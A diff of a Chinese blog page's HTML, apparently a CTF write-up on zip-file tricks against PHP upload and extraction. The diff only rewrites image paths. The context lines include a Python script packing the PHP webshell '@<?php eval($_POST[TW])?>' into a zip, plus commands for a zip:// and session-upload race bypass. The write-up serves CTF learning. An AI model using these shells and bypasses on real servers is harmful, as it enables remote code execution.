@@ -27,18 +27,18 @@
 <meta property="og:site_name" content="TWe1v3">
 <meta property="og:description" content="这是一场招新赛中的一个赛题做的总结，大佬们锤轻点QwQ">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://twe1v3.github.io/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png">
-<meta property="og:image" content="http://twe1v3.github.io/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145439629.png">
-<meta property="og:image" content="http://twe1v3.github.io/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145936187.png">
-<meta property="og:image" content="http://twe1v3.github.io/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png">
-<meta property="og:image" content="http://twe1v3.github.io/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106185559363.png">
-<meta property="og:image" content="http://twe1v3.github.io/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106184440246.png">
+<meta property="og:image" content="http://twe1v3.github.io/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png">
+<meta property="og:image" content="http://twe1v3.github.io/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145439629.png">
+<meta property="og:image" content="http://twe1v3.github.io/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145936187.png">
+<meta property="og:image" content="http://twe1v3.github.io/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png">
+<meta property="og:image" content="http://twe1v3.github.io/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106185559363.png">
+<meta property="og:image" content="http://twe1v3.github.io/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106184440246.png">
 <meta property="article:published_time" content="2022-10-22T16:43:13.000Z">
 <meta property="article:modified_time" content="2022-11-06T11:27:43.783Z">
 <meta property="article:author" content="TWe1v3">
 <meta property="article:tag" content="技术总结">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://twe1v3.github.io/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png">
+<meta name="twitter:image" content="http://twe1v3.github.io/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png">
 
 
 <link rel="canonical" href="http://twe1v3.github.io/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/">
@@ -297,7 +297,7 @@
 <h3 id="文件名报错"><a class="markdownIt-Anchor" href="#文件名报错"></a> 文件名/报错</h3>
 <p>在PHP架构中，有一个自带的解压函数ZipArchive。这里的报错解压就是使ZipArchive识别文件出错，但是能够正常保留压缩包中的文件。例如在windows下不允许文件中包含</p>
 <p>冒号(😃，我们就可以在010editor中修改压缩文件的deFileName属性的值，此时解压就会出错，但是一句话代码就会保留下来。在Linux下也有类似的方法，可以将文件名改成5个斜杠(/////)，此时Linux写解压也会出错，但是一句话木马被保留下来了。</p>
-<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png" alt="image-20221106143638292"></p>
+<p><img src="/./CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png" alt="image-20221106143638292"></p>
 <h3 id="超长文件名报错伴随一句话木马"><a class="markdownIt-Anchor" href="#超长文件名报错伴随一句话木马"></a> 超长文件名报错伴随一句话木马</h3>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(mf, mode=<span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;@&lt;?php eval($_POST[TW])?&gt;&#x27;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;A&#x27;</span> * <span class="number">5000</span>, <span class="string">b&#x27;AAAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shell.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mf.getvalue())</span><br></pre></td></tr></table></figure>
 <h2 id="利用姿势two同名解压"><a class="markdownIt-Anchor" href="#利用姿势two同名解压"></a> 利用姿势Two–同名解压</h2>
@@ -307,9 +307,9 @@
 <p>然后删除shell.php创建一个同名文件夹，里面随便放一些东西，再压缩进同一个压缩包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir shell.php</span><br><span class="line">zip -y test1.zip shell.php/1.txt</span><br></pre></td></tr></table></figure>
 <h3 id="创建0文件夹绕过"><a class="markdownIt-Anchor" href="#创建0文件夹绕过"></a> 创建“0”文件夹绕过</h3>
-<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145439629.png" alt="image-20221106145439629"></p>
+<p><img src="/./CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145439629.png" alt="image-20221106145439629"></p>
 <p>这里的read()函数不会处理0文件夹，所以这里的array返回值为空。</p>
-<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145936187.png" alt="image-20221106145936187"></p>
+<p><img src="/./CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145936187.png" alt="image-20221106145936187"></p>
 <p>所以file_list得到的也是空值，在执行删除目录或者文件的时候便不会删除到0文件夹下的内容。</p>
 <h2 id="利用姿势three目录穿越"><a class="markdownIt-Anchor" href="#利用姿势three目录穿越"></a> 利用姿势Three–目录穿越</h2>
 <h3 id="软连接"><a class="markdownIt-Anchor" href="#软连接"></a> 软连接</h3>
@@ -327,13 +327,13 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">(<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;yxxx&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>) &amp;&amp; @<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;@&lt;?php&#x27;</span> ? <span class="keyword">include</span>(<span class="variable">$_</span>) : <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) &amp;&amp; <span class="keyword">include</span>(<span class="string">&#x27;phpinfo.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
 <p>这里限制后缀必须是<code>.php</code>的文件才能够实现包含。这里可以利用zip来构成条件竞争来上传。</p>
 <p>这里需要传一个构造过的zip包，然后令<code>yxxx=zip:///tmp/sess_evil#1</code>这样，让后续的代码能够include它。但显然通过<em>session.upload_progress</em>搞上去的文件最开始的字符串内容是<code>upload_progress_</code>，所以必须想办法绕过<code>@substr(file($_)[0],0,6) === '@&lt;?php'</code>的判断。</p>
-<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" alt="1.png"></p>
+<p><img src="/./CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" alt="1.png"></p>
 <p>根据<a target="_blank" rel="noopener" href="https://github.com/corkami/collisions#zip">上图</a>，我们不难发现<code>End of Central Directory</code>(中央目录结束)里面有一个<code>offset of start of central</code>(中心起点的偏移量)，左下的示意图说明程序处理zip文件的时候首先从这个文件末尾出发，根据偏移找到Central Directory<code>(中央目录)的头位置，然后再根据</code>relative offset of local header<code>(本地头的相对偏移量)找到整个zip文件头的位置，也就指向</code>local file header signature`(本地文件头签名)</p>
 <p><strong>zip构造</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip shell.zip 1.php</span><br><span class="line">echo -n &quot;upload_progress_&quot; &gt; f</span><br><span class="line">cat f shell.zip &gt; b.zip</span><br><span class="line">zip -F b.zip --out c.zip</span><br></pre></td></tr></table></figure>
 <p>这里的解决办法就是修改这两个offset，这样zip协议能够跳开前面几个字符找到正确的位置。另外，CRC的值我们也不必进行修改，因为<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/63647618/how-to-validate-crc-32-calculation-of-zip-file">这里的crc-32其实是根据crc前面的相关信息计算出来的结果</a>。因为最开始的字符串内容是<code>upload_progress_</code>，其长度为16，因此这两个offset（从010editor来看就是<code>elDirectoryOffset</code>(el目录偏移量)和<code>deHeaderOffset</code>(de标头偏移量)）都要加上16。</p>
-<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106185559363.png" alt="image-20221106185559363"></p>
-<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106184440246.png" alt="image-20221106184440246"></p>
+<p><img src="/./CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106185559363.png" alt="image-20221106185559363"></p>
+<p><img src="/./CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106184440246.png" alt="image-20221106184440246"></p>
 
     </div>
 
